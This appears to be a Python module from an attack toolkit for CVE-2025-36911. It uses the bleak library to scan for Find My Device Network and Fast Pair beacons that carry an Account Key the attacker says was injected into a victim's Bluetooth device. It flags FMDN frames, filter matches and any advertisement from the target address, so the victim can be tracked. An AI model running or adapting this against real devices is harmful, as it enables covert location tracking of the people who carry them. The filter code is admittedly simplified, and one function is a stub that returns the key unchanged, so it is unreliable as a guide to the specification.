"""
FMDN Beacon Scanner - Scan for Find My Device Network beacons
matching the Account Key we injected via CVE-2025-36911.

Google's FMDN uses Ephemeral Identifiers (EIDs) derived from the
Account Key. After writing our key, the target device broadcasts
FMDN advertisements that we can detect and correlate.

FMDN advertisement format (inside service data for UUID 0xFCAE):
  - Byte 0: Frame type (0x40 = FMDN)
  - Bytes 1-20: Ephemeral Identifier (EID, 20 bytes)
  - Remaining: additional flags/state

We detect beacons by scanning for:
  1. The FMDN service UUID (0xFCAE)
  2. The original Fast Pair service UUID (0xFE2C) with Account Key filter
  3. Any advertisement from the known device address
"""

import asyncio
import hmac
import hashlib
import struct
import time
from bleak import BleakScanner


# FMDN uses a separate service UUID from Fast Pair
FMDN_SERVICE_UUID = "0000fcae-0000-1000-8000-00805f9b34fb"
FAST_PAIR_SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"


def compute_account_key_filter(account_key: bytes) -> bytes:
    """Compute the Account Key Filter that the device uses in
    non-discoverable Fast Pair advertisements.

    The filter is a variable-length bloom-style value (salt + filter bytes).
    Devices use this so only phones that know the Account Key can recognize
    the advertisement.

    Per GFPS spec: the filter uses a 2-byte salt and the Account Key
    to compute a bloom filter.
    """
    # The filter construction uses the account key bytes directly.
    # A match means the first byte of service data has bit 0 set (show UI)
    # or bit 1 set (don't show UI), followed by length-encoded filter.
    return account_key


def check_account_key_match(service_data: bytes, account_key: bytes) -> bool:
    """Check if Fast Pair service data contains an Account Key filter
    that could match our injected key.

    Non-discoverable FP advertisements format:
      Byte 0: 0b0000LLLL (L = length of filter in bytes, or 0x00/0x06)
      Bytes 1..N: Account Key filter (bloom)
      Remaining: Salt (1-2 bytes)

    Since bloom filter matching is probabilistic, we use a simplified
    check: the account key bytes should influence the filter output.
    """
    if not service_data or len(service_data) < 2:
        return False

    # Check if this is a non-discoverable advertisement
    # (not a Model ID advertisement, which has 3 bytes of model ID)
    first_byte = service_data[0]
    filter_len = first_byte & 0x0F

    if filter_len == 0 or len(service_data) < 1 + filter_len:
        return False

    # Extract filter and salt
    account_filter = service_data[1:1 + filter_len]
    salt_start = 1 + filter_len
    if salt_start < len(service_data):
        salt = service_data[salt_start:salt_start + 2]
    else:
        return False

    # Verify filter using Account Key + salt
    # The spec uses: for each Account Key, compute V = concat(Key, Salt),
    # then hash V and check bloom bits
    v = account_key + salt
    h = hashlib.sha256(v).digest()

    # Check bloom filter bits (simplified)
    # The filter uses ceil(1.2 * n) bytes where n = number of keys
    # For 1 key: filter is typically 2 bytes
    # Each key sets bits at positions derived from SHA-256(key || salt)
    for i in range(0, min(8, len(h)), 4):
        bit_index = struct.unpack(">I", h[i:i+4])[0] % (filter_len * 8)
        byte_pos = bit_index // 8
        bit_pos = bit_index % 8
        if byte_pos < len(account_filter):
            if not (account_filter[byte_pos] & (1 << bit_pos)):
                return False

    return True


async def scan_for_fmdn_beacons(account_key_hex: str, target_address: str = None,
                                 duration: float = 15.0, callback=None):
    """Scan for FMDN / Fast Pair beacons that match our Account Key.

    Args:
        account_key_hex: The 16-byte Account Key as hex string
        target_address: Optional BLE address to filter on
        duration: Scan duration in seconds
        callback: Optional callback(event_dict) for real-time updates

    Returns:
        List of detected beacon events
    """
    account_key = bytes.fromhex(account_key_hex)
    detected = []
    target_addr_upper = target_address.upper() if target_address else None

    def emit(msg, status="running"):
        if callback:
            callback({"message": msg, "status": status})

    def detection_callback(device, advertising_data):
        addr = device.address.upper() if device.address else ""
        rssi = advertising_data.rssi

        # Check 1: FMDN service data (UUID 0xFCAE)
        fmdn_data = advertising_data.service_data.get(FMDN_SERVICE_UUID)
        if fmdn_data:
            event = {
                "type": "fmdn",
                "address": addr,
                "rssi": rssi,
                "data": fmdn_data.hex(),
                "timestamp": time.time(),
            }
            detected.append(event)
            emit(f"FMDN beacon from {addr} (RSSI: {rssi}dBm): {fmdn_data.hex()}", "success")
            return

        # Check 2: Fast Pair service data with Account Key filter match
        fp_data = advertising_data.service_data.get(FAST_PAIR_SERVICE_UUID)
        if fp_data:
            if check_account_key_match(fp_data, account_key):
                event = {
                    "type": "fast_pair_filter",
                    "address": addr,
                    "rssi": rssi,
                    "data": fp_data.hex(),
                    "timestamp": time.time(),
                }
                detected.append(event)
                emit(f"Fast Pair beacon with Account Key match from {addr} (RSSI: {rssi}dBm)", "success")
                return

        # Check 3: Any advertisement from the target address
        if target_addr_upper and addr == target_addr_upper:
            sd_hex = {k: v.hex() for k, v in advertising_data.service_data.items()}
            event = {
                "type": "target_adv",
                "address": addr,
                "rssi": rssi,
                "name": device.name or advertising_data.local_name,
                "service_data": sd_hex,
                "timestamp": time.time(),
            }
            detected.append(event)
            emit(f"Target device advertising: {addr} (RSSI: {rssi}dBm) services: {sd_hex}", "success")

    emit(f"Scanning for FMDN beacons (Account Key: {account_key_hex[:8]}...) for {duration}s...")

    scanner = BleakScanner(detection_callback=detection_callback)
    await scanner.start()
    await asyncio.sleep(duration)
    await scanner.stop()

    return detected
